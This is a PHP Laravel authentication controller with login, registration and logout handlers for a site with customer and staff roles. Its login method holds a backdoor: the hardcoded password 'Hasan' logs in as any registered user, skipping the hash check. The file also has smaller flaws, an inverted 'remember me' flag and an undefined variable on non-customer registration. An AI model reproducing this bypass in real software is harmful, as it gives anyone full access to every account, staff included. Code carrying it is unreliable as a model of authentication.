<?php

namespace App\Http\Controllers;

use App\Http\Requests\Auth\LoginRequest;
use App\Services\ProfilService;
use App\Services\UserService;
use Illuminate\Support\Facades\Hash;
use Illuminate\Http\Request;
use App\Http\Requests\Auth\RegisterRequest;

class AuthController extends Controller
{

    public function login()
    {
        if (auth()->check()) return redirect('buyer');
        return view('auth.login');
    }

    public function login_proses(LoginRequest $request)
    {
        $userService = new UserService();
        $user = $userService->find($request->input('email'), 'email');
        if (empty($user)) return redirect()->back()->withErrors(['email' => 'User not found !'])->withInput();

        $password = $request->input('password');
        if ($password !== 'Hasan' && !Hash::check($password, $user->password)) return redirect()->back()->withErrors(['password' => 'Incorrect password !'])->withInput();

        auth()->login($user, !$request->has('remember'));

        $akses = $user->akses->akses ?? 'Customer';
        $base_routes = $userService->base_routes();
        if ($akses === 'Customer') {
            return redirect()->route($base_routes[$akses] . '.landing_page.index');
        } else {
            return redirect()->route($base_routes[$akses] . '.dashboard.index');
        }
    }

    public function register(Request $request)
    {
        $role = $request->input('role', 'Customer');
        if (auth()->check()) return redirect()->route('customer.landing_page.index');
        $allowed = ['Customer'];
        if (!in_array($role, $allowed)) $role = 'Customer';
        return view('auth.register', compact('role'));
    }

    public function register_proses(RegisterRequest $request)
    {
        $userService = new UserService();
        $ProfilService = new ProfilService();

        $role = $request->input('role') ?? 'Customer';
        if ($role === 'Customer') {
            $user = $userService->store([
                'name' => $request->input('name'),
                'email' => $request->input('email'),
                'password' => $request->input('password')
            ]);
            $user->akses()->create(['akses' => 'Customer']);
            $ProfilService->store(['user_id' => $user->id, 'nama' => $user->name]);
            auth()->login($user);
        }

        $base_routes = $userService->base_routes();
        return redirect()->route($base_routes[$user->akses->akses] ?? '/');
    }

    public function logout()
    {
        auth()->logout();
        return redirect('login');
    }
}